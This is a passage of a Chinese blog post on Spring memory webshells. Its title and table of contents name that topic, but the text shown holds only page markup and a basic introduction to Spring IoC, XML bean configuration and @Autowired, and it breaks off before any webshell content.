20.15 7.83L20.15 7.83L20.15 7.83Q20.17 7.87 20.32 8.07L20.32 8.07L20.32 8.07Q20.47 8.27 20.69 8.58L20.69 8.58L20.69 8.58Q20.90 8.88 21.13 9.24L21.13 9.24L21.13 9.24Q21.37 9.60 21.57 9.95L21.57 9.95L21.57 9.95Q21.78 9.67 22.03 9.32L22.03 9.32L22.03 9.32Q22.29 8.98 22.53 8.66L22.53 8.66L22.53 8.66Q22.77 8.35 22.98 8.12L22.98 8.12L22.98 8.12Q23.18 7.89 23.28 7.83L23.28 7.83L23.28 7.83Q23.36 7.79 23.39 7.77L23.39 7.77L23.39 7.77Q23.43 7.76 23.45 7.76L23.45 7.76L23.45 7.76Q23.48 7.76 23.52 7.80L23.52 7.80L23.52 7.80Q23.58 7.83 23.64 7.85L23.64 7.85L23.64 7.85Q23.70 7.87 23.74 7.93L23.74 7.93L23.74 7.93Q23.80 7.99 23.80 8.06L23.80 8.06L23.80 8.06Q23.81 8.12 23.79 8.20L23.79 8.20L23.79 8.20Q23.78 8.23 23.67 8.39L23.67 8.39L23.67 8.39Q23.56 8.56 23.34 8.85L23.34 8.85L23.34 8.85Q23.12 9.15 22.77 9.57L22.77 9.57L22.77 9.57Q22.43 10.00 21.94 10.58L21.94 10.58L21.94 10.58Q22.07 10.81 22.24 11.08L22.24 11.08L22.24 11.08Q22.42 11.35 22.60 11.61L22.60 11.61L22.60 11.61Q22.78 11.87 22.95 12.12L22.95 12.12L22.95 12.12Q23.12 12.36 23.26 12.55L23.26 12.55L23.26 12.55Q23.41 12.75 23.51 12.88L23.51 12.88L23.51 12.88Q23.60 13.01 23.63 13.04ZM29.19 11.40L29.19 11.40L29.19 11.40Q29.19 11.79 29.02 12.20L29.02 12.20L29.02 12.20Q28.85 12.60 28.54 12.93L28.54 12.93L28.54 12.93Q28.23 13.26 27.78 13.47L27.78 13.47L27.78 13.47Q27.34 13.69 26.78 13.69L26.78 13.69L26.78 13.69Q26.33 13.69 25.87 13.49L25.87 13.49L25.87 13.49Q25.41 13.30 25.04 12.94L25.04 12.94L25.04 12.94Q24.67 12.58 24.44 12.07L24.44 12.07L24.44 12.07Q24.21 11.56 24.21 10.92L24.21 10.92L24.21 10.92Q24.21 10.29 24.45 9.73L24.45 9.73L24.45 9.73Q24.69 9.17 25.09 8.75L25.09 8.75L25.09 8.75Q25.48 8.33 25.99 8.08L25.99 8.08L25.99 8.08Q26.50 7.83 27.04 7.83L27.04 7.83L27.04 7.83Q27.54 7.83 27.89 7.97L27.89 7.97L27.89 7.97Q28.23 8.10 28.44 8.28L28.44 8.28L28.44 8.28Q28.66 8.46 28.75 8.65L28.75 8.65L28.75 8.65Q28.84 8.85 28.84 8.96L28.84 8.96L28.84 8.96Q28.84 9.22 28.73 9.39L28.73 9.39L28.73 9.39Q28.62 9.55 28.48 9.63L28.48 9.63L28.48 9.63Q28.34 9.71 28.22 9.72L28.22 9.72L28.22 9.72Q28.09 9.73 28.05 9.68L28.05 9.68L28.05 9.68Q28.03 9.65 28.00 9.65L28.00 9.65L28.00 9.65Q27.97 9.65 27.93 9.67L27.93 9.67L27.93 9.67Q27.90 9.68 27.87 9.69L27.87 9.69L27.87 9.69Q27.84 9.71 27.82 9.69L27.82 9.69L27.82 9.69Q27.78 9.68 27.81 9.63L27.81 9.63L27.81 9.63Q27.84 9.58 27.84 9.55L27.84 9.55L27.84 9.55Q27.84 9.49 27.84 9.41L27.84 9.41L27.84 9.41Q27.84 9.33 27.87 9.24L27.87 9.24L27.87 9.24Q27.93 9.12 27.92 8.97L27.92 8.97L27.92 8.97Q27.91 8.83 27.82 8.70L27.82 8.70L27.82 8.70Q27.73 8.57 27.53 8.48L27.53 8.48L27.53 8.48Q27.34 8.39 27.03 8.39L27.03 8.39L27.03 8.39Q26.81 8.39 26.51 8.53L26.51 8.53L26.51 8.53Q26.21 8.67 25.94 8.98L25.94 8.98L25.94 8.98Q25.67 9.28 25.48 9.75L25.48 9.75L25.48 9.75Q25.29 10.22 25.29 10.87L25.29 10.87L25.29 10.87Q25.29 11.15 25.36 11.46L25.36 11.46L25.36 11.46Q25.44 11.76 25.62 12.02L25.62 12.02L25.62 12.02Q25.81 12.28 26.12 12.45L26.12 12.45L26.12 12.45Q26.43 12.62 26.92 12.62L26.92 12.62L26.92 12.62Q27.24 12.62 27.51 12.53L27.51 12.53L27.51 12.53Q27.78 12.44 28 12.30L28 12.30L28 12.30Q28.22 12.17 28.39 12.00L28.39 12.00L28.39 12.00Q28.56 11.84 28.68 11.69L28.68 11.69L28.68 11.69Q28.79 11.55 28.86 11.44L28.86 11.44L28.86 11.44Q28.92 11.33 28.94 11.30L28.94 11.30L28.94 11.30Q28.96 11.27 29.00 11.25L29.00 11.25L29.00 11.25Q29.05 11.23 29.09 11.24L29.09 11.24L29.09 11.24Q29.13 11.25 29.16 11.29L29.16 11.29L29.16 11.29Q29.19 11.33 29.19 11.40ZM32.44 13.19L32.44 13.19L32.44 13.19Q32.85 13.19 33.25 13.27L33.25 13.27L33.25 13.27Q33.66 13.34 33.99 13.52L33.99 13.52L33.99 13.52Q34.32 13.70 34.52 13.99L34.52 13.99L34.52 13.99Q34.72 14.28 34.72 14.72L34.72 14.72L34.72 14.72Q34.72 15.04 34.57 15.37L34.57 15.37L34.57 15.37Q34.42 15.70 34.15 16.00L34.15 16.00L34.15 16.00Q33.89 16.31 33.53 16.58L33.53 16.58L33.53 16.58Q33.17 16.86 32.75 17.06L32.75 17.06L32.75 17.06Q32.33 17.26 31.88 17.38L31.88 17.38L31.88 17.38Q31.43 17.49 30.98 17.49L30.98 17.49L30.98 17.49Q30.61 17.49 30.29 17.41L30.29 17.41L30.29 17.41Q29.96 17.34 29.72 17.18L29.72 17.18L29.72 17.18Q29.48 17.02 29.33 16.79L29.33 16.79L29.33 16.79Q29.19 16.55 29.19 16.23L29.19 16.23L29.19 16.23Q29.19 15.91 29.31 15.64L29.31 15.64L29.31 15.64Q29.44 15.36 29.64 15.13L29.64 15.13L29.64 15.13Q29.84 14.90 30.10 14.71L30.10 14.71L30.10 14.71Q30.36 14.52 30.64 14.39L30.64 14.39L30.64 14.39Q30.91 14.27 31.18 14.20L31.18 14.20L31.18 14.20Q31.45 14.13 31.66 14.13L31.66 14.13L31.66 14.13Q31.78 14.14 31.82 14.16L31.82 14.16L31.82 14.16Q31.86 14.18 31.86 14.20L31.86 14.20L31.86 14.20Q31.86 14.22 31.84 14.25L31.84 14.25L31.84 14.25Q31.82 14.28 31.82 14.30L31.82 14.30L31.82 14.30Q31.83 14.34 31.85 14.40L31.85 14.40L31.85 14.40Q31.86 14.45 31.86 14.51L31.86 14.51L31.86 14.51Q31.86 14.57 31.84 14.63L31.84 14.63L31.84 14.63Q31.81 14.68 31.74 14.69L31.74 14.69L31.74 14.69Q31.45 14.76 31.11 14.92L31.11 14.92L31.11 14.92Q30.76 15.09 30.46 15.31L30.46 15.31L30.46 15.31Q30.15 15.53 29.95 15.79L29.95 15.79L29.95 15.79Q29.74 16.04 29.74 16.30L29.74 16.30L29.74 16.30Q29.74 16.43 29.85 16.48L29.85 16.48L29.85 16.48Q29.97 16.54 30.18 16.54L30.18 16.54L30.18 16.54Q30.44 16.54 30.80 16.46L30.80 16.46L30.80 16.46Q31.17 16.39 31.55 16.25L31.55 16.25L31.55 16.25Q31.94 16.11 32.32 15.90L32.32 15.90L32.32 15.90Q32.70 15.70 33.01 15.45L33.01 15.45L33.01 15.45Q33.31 15.20 33.50 14.90L33.50 14.90L33.50 14.90Q33.68 14.61 33.68 14.27L33.68 14.27L33.68 14.27Q33.68 14.11 33.62 14.02L33.62 14.02L33.62 14.02Q33.55 13.92 33.47 13.88L33.47 13.88L33.47 13.88Q33.38 13.83 33.29 13.82L33.29 13.82L33.29 13.82Q33.20 13.81 33.13 13.81L33.13 13.81L33.13 13.81Q32.65 13.81 32.14 13.87L32.14 13.87L32.14 13.87Q31.64 13.92 31.22 13.99L31.22 13.99L31.22 13.99Q30.81 14.05 30.54 14.11L30.54 14.11L30.54 14.11Q30.28 14.17 30.26 14.17L30.26 14.17L30.26 14.17Q30.11 14.17 29.99 14.11L29.99 14.11L29.99 14.11Q29.86 14.05 29.77 13.95L29.77 13.95L29.77 13.95Q29.68 13.86 29.63 13.73L29.63 13.73L29.63 13.73Q29.58 13.60 29.58 13.47L29.58 13.47L29.58 13.47Q29.58 13.37 29.70 13.18L29.70 13.18L29.70 13.18Q29.83 12.98 30.02 12.76L30.02 12.76L30.02 12.76Q30.22 12.53 30.48 12.31L30.48 12.31L30.48 12.31Q30.73 12.09 30.99 11.95L30.99 11.95L30.99 11.95Q30.76 11.83 30.58 11.65L30.58 11.65L30.58 11.65Q30.39 11.47 30.27 11.27L30.27 11.27L30.27 11.27Q30.14 11.06 30.07 10.83L30.07 10.83L30.07 10.83Q30.00 10.60 30.00 10.36L30.00 10.36L30.00 10.36Q30.00 9.90 30.13 9.54L30.13 9.54L30.13 9.54Q30.26 9.18 30.47 8.91L30.47 8.91L30.47 8.91Q30.69 8.65 30.95 8.47L30.95 8.47L30.95 8.47Q31.21 8.29 31.47 8.18L31.47 8.18L31.47 8.18Q31.73 8.07 31.96 8.03L31.96 8.03L31.96 8.03Q32.20 7.98 32.35 7.98L32.35 7.98L32.35 7.98Q32.43 7.98 32.48 7.99L32.48 7.99L32.48 7.99Q32.53 8.00 32.57 8.01L32.57 8.01L32.57 8.01Q32.74 7.74 32.97 7.43L32.97 7.43L32.97 7.43Q33.19 7.12 33.42 6.81L33.42 6.81L33.42 6.81Q33.66 6.51 33.90 6.23L33.90 6.23L33.90 6.23Q34.13 5.95 34.33 5.74L34.33 5.74L34.33 5.74Q34.52 5.52 34.66 5.40L34.66 5.40L34.66 5.40Q34.79 5.27 34.84 5.27L34.84 5.27L34.84 5.27Q34.90 5.27 34.99 5.35L34.99 5.35L34.99 5.35Q35.08 5.43 35.16 5.53L35.16 5.53L35.16 5.53Q35.25 5.63 35.30 5.72L35.30 5.72L35.30 5.72Q35.36 5.81 35.36 5.84L35.36 5.84L35.36 5.84Q35.36 5.88 35.33 5.91L35.33 5.91L35.33 5.91Q35.31 5.93 35.31 5.95L35.31 5.95L35.31 5.95Q35.31 5.99 35.35 6.01L35.35 6.01L35.35 6.01Q35.38 6.04 35.46 6.07L35.46 6.07L35.46 6.07Q35.47 6.08 35.48 6.08L35.48 6.08L35.48 6.08Q35.49 6.08 35.49 6.10L35.49 6.10L35.49 6.10Q35.49 6.13 35.40 6.19L35.40 6.19L35.40 6.19Q35.31 6.25 35.11 6.42L35.11 6.42L35.11 6.42Q34.91 6.58 34.60 6.86L34.60 6.86L34.60 6.86Q34.28 7.15 33.82 7.62L33.82 7.62L33.82 7.62Q33.71 7.72 33.60 7.88L33.60 7.88L33.60 7.88Q33.48 8.03 33.35 8.20L33.35 8.20L33.35 8.20Q33.52 8.29 33.71 8.45L33.71 8.45L33.71 8.45Q33.91 8.61 34.06 8.81L34.06 8.81L34.06 8.81Q34.21 9.02 34.31 9.29L34.31 9.29L34.31 9.29Q34.41 9.56 34.41 9.86L34.41 9.86L34.41 9.86Q34.41 10.52 34.19 10.96L34.19 10.96L34.19 10.96Q33.97 11.41 33.63 11.68L33.63 11.68L33.63 11.68Q33.28 11.95 32.85 12.07L32.85 12.07L32.85 12.07Q32.42 12.18 32.00 12.18L32.00 12.18L32.00 12.18Q31.90 12.18 31.80 12.17L31.80 12.17L31.80 12.17Q31.71 12.17 31.62 12.15L31.62 12.15L31.62 12.15Q31.47 12.26 31.27 12.41L31.27 12.41L31.27 12.41Q31.07 12.56 30.88 12.74L30.88 12.74L30.88 12.74Q30.69 12.91 30.53 13.10L30.53 13.10L30.53 13.10Q30.37 13.28 30.28 13.45L30.28 13.45L30.28 13.45Q30.56 13.44 30.81 13.40L30.81 13.40L30.81 13.40Q31.06 13.36 31.32 13.32L31.32 13.32L31.32 13.32Q31.58 13.27 31.85 13.23L31.85 13.23L31.85 13.23Q32.12 13.19 32.44 13.19ZM32.22 8.83L32.22 8.83L32.22 8.83Q32.22 8.69 32.38 8.36L32.38 8.36L32.38 8.36Q32.06 8.46 31.81 8.67L31.81 8.67L31.81 8.67Q31.55 8.87 31.38 9.13L31.38 9.13L31.38 9.13Q31.20 9.39 31.10 9.69L31.10 9.69L31.10 9.69Q31.01 9.99 31.01 10.28L31.01 10.28L31.01 10.28Q31.01 10.49 31.06 10.69L31.06 10.69L31.06 10.69Q31.11 10.88 31.22 11.04L31.22 11.04L31.22 11.04Q31.33 11.19 31.50 11.28L31.50 11.28L31.50 11.28Q31.68 11.38 31.93 11.38L31.93 11.38L31.93 11.38Q32.20 11.38 32.42 11.28L32.42 11.28L32.42 11.28Q32.63 11.18 32.80 11.02L32.80 11.02L32.80 11.02Q32.96 10.86 33.08 10.66L33.08 10.66L33.08 10.66Q33.19 10.46 33.26 10.26L33.26 10.26L33.26 10.26Q33.33 10.07 33.37 9.90L33.37 9.90L33.37 9.90Q33.40 9.73 33.40 9.63L33.40 9.63L33.40 9.63Q33.40 9.21 33.27 8.99L33.27 8.99L33.27 8.99Q33.13 8.76 32.96 8.64L32.96 8.64L32.96 8.64Q32.86 8.76 32.76 8.86L32.76 8.86L32.76 8.86Q32.66 8.97 32.55 9.08L32.55 9.08L32.55 9.08Q32.53 9.09 32.50 9.09L32.50 9.09L32.50 9.09Q32.48 9.09 32.47 9.07L32.47 9.07L32.47 9.07Q32.46 9.05 32.42 9.05L32.42 9.05L32.42 9.05Q32.40 9.05 32.38 9.07L32.38 9.07L32.38 9.07Q32.36 9.09 32.33 9.09L32.33 9.09L32.33 9.09Q32.28 9.09 32.25 9.04L32.25 9.04L32.25 9.04Q32.22 8.98 32.22 8.83Z"></path></g><!----><!----></svg></a>
        
    </div>

                    <nav class="nav">
    <ul class="menu" id="menu">
        
            
        
        
        
        
            
                <li class="menu-item"><a href="/archives/"><span class="menu-item-name">文章</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
                </li>
            
        
            
                
                    
                    
                
            
        
            
                
            
        
    </ul>
</nav>

                    
                </div>
            </div>
            
    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
    <label for="nav-toggle" class="nav-toggle"></label>
    <label for="nav-toggle" class="nav-curtain"></label>


        
    </header>




            
            
    <main class="main single" id="main">
    <div class="main-inner">

        

        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">

            <h1 class="post-title p-name">Spring 内存马实现</h1>

            

            
                
            

            
                

<div class="post-meta">
    
        
        <time datetime="2021-11-13T20:59:58&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.11.13</time>
    
    
    
    
        
        
        
            
        
    
    
    
        
        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;17&nbsp;分钟</span>
    

   
    

    
    
</div>

            

            <nav class="contents">
  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
    <li><a id="contents:spring-介绍" href="#spring-介绍">Spring 介绍</a>
      <ol>
        <li><a id="contents:ioc容器" href="#ioc容器">IoC容器</a></li>
        <li><a id="contents:注解自动装载bean" href="#注解自动装载bean">注解自动装载bean</a></li>
        <li><a id="contents:applicationcontext" href="#applicationcontext">ApplicationContext</a></li>
        <li><a id="contents:contextloaderlistener与dispatcherservlet" href="#contextloaderlistener与dispatcherservlet">ContextLoaderListener与DispatcherServlet</a></li>
      </ol>
    </li>
    <li><a id="contents:获得当前代码运行时上下文环境" href="#获得当前代码运行时上下文环境">获得当前代码运行时上下文环境</a></li>
    <li><a id="contents:controller内存马" href="#controller内存马">Controller内存马</a>
      <ol>
        <li><a id="contents:注册controller" href="#注册controller">注册Controller</a></li>
      </ol>
    </li>
    <li><a id="contents:intercetor内存马" href="#intercetor内存马">intercetor内存马</a>
      <ol>
        <li><a id="contents:原理分析" href="#原理分析">原理分析</a></li>
        <li><a id="contents:动态注入interceptor" href="#动态注入interceptor">动态注入Interceptor</a></li>
      </ol>
    </li>
    <li><a id="contents:参考" href="#参考">参考</a></li>
  </ol>
</nav><div class="post-body e-content">
                <blockquote>
<p>Spring框架是一个开放源代码的J2EE应用程序框架，是针对bean的生命周期进行管理的轻量级容器。Spring可以单独应用于构筑应用程序，也可以和Struts、Webwork、Tapestry等众多Web框架组合使用，并且可以与 Swing等桌面应用程序AP组合。</p>
</blockquote>
<h2 id="spring-介绍"><a href="#spring-介绍" class="anchor-link">#</a><a href="#contents:spring-介绍" class="headings">Spring 介绍</a></h2>
<p>Spring 框架主要由七部分组成，分别是<code>Spring Core、Spring AOP、Spring ORM、Spring DAO、Spring Context、Spring Web 、Spring Web MVC</code>。</p>
<p>Spring全家桶包括5个关键部分: <code>Spring framework、Spring MVC、Spring Boot、Spring Cloud、Spring Security</code>。其中spring framework 就是常提到的spring，这是所有spring内容最基本的底层架构，其包含spring mvc、springboot、spring core、IOC和AOP等等。Spring mvc就是spring中的一个MVC框架，主要用来开发web应用和网络接口，但是其使用之前需要配置大量的xml文件，比较繁琐，所以出现springboot，其内置tomcat并且内置默认的XML配置信息，从而方便了用户的使用。Spring Cloud基于Spring Boot，简化了分布式系统的开发。Spring Security用于做鉴权，保证安全性。</p>
<h3 id="ioc容器"><a href="#ioc容器" class="anchor-link">#</a><a href="#contents:ioc容器" class="headings">IoC容器</a></h3>
<p>如果一个系统有大量的组件（类），其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。解决这一问题的核心方案就是IoC（又称为依赖注入）。由IoC负责创建组件、根据依赖关系组装组件、按依赖顺序正确销毁组件。</p>
<p>IoC容器要负责实例化所有的组件，因此有必要告诉容器如何创建组件，以及各组件的依赖关系。一种最简单的配置是通过XML文件来实现。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;beans&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;dataSource&#34;</span> <span class="na">class=</span><span class="s">&#34;HikariDataSource&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;bookService&#34;</span> <span class="na">class=</span><span class="s">&#34;BookService&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;dataSource&#34;</span> <span class="na">ref=</span><span class="s">&#34;dataSource&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/bean&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;userService&#34;</span> <span class="na">class=</span><span class="s">&#34;UserService&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;dataSource&#34;</span> <span class="na">ref=</span><span class="s">&#34;dataSource&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/bean&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/beans&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">&lt;!--
</span></span></span><span class="line"><span class="cl"><span class="c">bean标签 默认情况下它调用的是类中的无参构造函数。如果没有无参构造函数则不能创建成功。
</span></span></span><span class="line"><span class="cl"><span class="c">属性id：给对象在容器中提供一个唯一标识。用于获取对象。
</span></span></span><span class="line"><span class="cl"><span class="c">class： 指定类的全限定类名。用于反射创建对象。默认情况下调用无参构造函数。
</span></span></span><span class="line"><span class="cl"><span class="c">property标签：通过Set注入（比如这里就是通过调用SetdataSource() 方法来给BookService和UserService对象的dataSource字段赋值）
</span></span></span><span class="line"><span class="cl"><span class="c">--&gt;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>上述XML配置文件指示IoC容器创建3个JavaBean组件（类），并把id为dataSource的组件通过属性dataSource（即调用setDataSource()方法）注入到另外两个组件中。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//例如：获取BookService的实例对象
</span></span></span><span class="line"><span class="cl"><span class="c1">//创建一个Spring的IoC容器实例，然后加载配置文件。让Spring容器创建并装配好配置文件中指定的所有Bean。
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ApplicationContext</span> <span class="n">cl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassPathXmlApplicationContext</span><span class="o">(</span><span class="s">&#34;bean.xml&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//获取BookService对象（对象由IOC容器实例化）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">bookService</span> <span class="n">bs</span> <span class="o">=</span> <span class="o">(</span><span class="n">bookService</span><span class="o">)</span><span class="n">cl</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="s">&#34;bookService&#34;</span><span class="o">);</span>  
</span></span><span class="line"><span class="cl"><span class="n">bs</span><span class="o">.</span><span class="na">select</span><span class="o">();</span><span class="c1">//调用对象方法
</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>这里的bean是由Spring IoC容器负责实例化、配置、组装和管理的对象。</p>
<h3 id="注解自动装载bean"><a href="#注解自动装载bean" class="anchor-link">#</a><a href="#contents:注解自动装载bean" class="headings">注解自动装载bean</a></h3>
<p>使用注解自动装载bean（对象）的话，需要在xml中加上<code>context:annotation-config</code>标签，并且需要导入约束。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">&#34;1.0&#34;</span> <span class="n">encoding</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="o">?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">beans</span> <span class="n">xmlns</span><span class="o">=</span><span class="s">&#34;&lt;http://www.springframework.org/schema/beans&gt;&#34;</span>
</span></span><span class="line"><span class="cl">       <span class="n">xmlns</span><span class="o">:</span><span class="n">xsi</span><span class="o">=</span><span class="s">&#34;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&#34;</span>
</span></span><span class="line"><span class="cl">       <span class="n">xmlns</span><span class="o">:</span><span class="n">context</span><span class="o">=</span><span class="s">&#34;&lt;http://www.springframework.org/schema/context&gt;&#34;</span>
</span></span><span class="line"><span class="cl">       <span class="n">xsi</span><span class="o">:</span><span class="n">schemaLocation</span><span class="o">=</span><span class="s">&#34;&lt;http://www.springframework.org/schema/beans&gt;
</span></span></span><span class="line"><span class="cl"><span class="s">       &lt;http://www.springframework.org/schema/beans/spring-beans.xsd&gt;
</span></span></span><span class="line"><span class="cl"><span class="s">       &lt;http://www.springframework.org/schema/context&gt;
</span></span></span><span class="line"><span class="cl"><span class="s">       &lt;https://www.springframework.org/schema/context/spring-context.xsd&gt;&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">context</span><span class="o">:</span><span class="n">annotation</span><span class="o">-</span><span class="n">config</span><span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">bean</span> <span class="n">id</span><span class="o">=</span><span class="s">&#34;cat&#34;</span> <span class="n">class</span><span class="o">=</span><span class="s">&#34;com.test.doamin.Cat&#34;</span><span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">bean</span> <span class="n">id</span><span class="o">=</span><span class="s">&#34;dog&#34;</span> <span class="n">class</span><span class="o">=</span><span class="s">&#34;com.test.doamin.Dong&#34;</span><span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">bean</span> <span class="n">id</span><span class="o">=</span><span class="s">&#34;person&#34;</span> <span class="n">class</span><span class="o">=</span><span class="s">&#34;com.test.doamin.Perpon&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">property</span> <span class="n">name</span><span class="o">=</span><span class="s">&#34;name&#34;</span> <span class="n">value</span><span class="o">=</span><span class="s">&#34;xiaoming&#34;</span><span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">bean</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">beans</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//再到成员变量处加入@Autowired注解声明
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="nd">@Autowired</span>
</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="n">Dong</span> <span class="n">dog</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="nd">@Autowired</span>
</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="n">Cat</span> <span class="n">cat</span><span class="o">;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><code>context:annotation-config</code>用于激活那些已经在spring容器里注册过的bean上面的注解。(激活@Resource和@Autowired注解)</p>
<p><code>&lt;context:component-scan&gt;</code>元素除了完成与<code>&lt;context:annotation-config&gt;</code>一样的工作，还允许Spring自动检测Bean和定义的Bean，这意味着不使用配置<bean>元素。base-package属性标识了会所扫描的包。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!--开启注解扫描--&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;context:component-scan</span> <span class="na">base-package=</span><span class="s">&#34;com.example&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">&lt;!--配置不扫描Controller注解--&gt;</span>
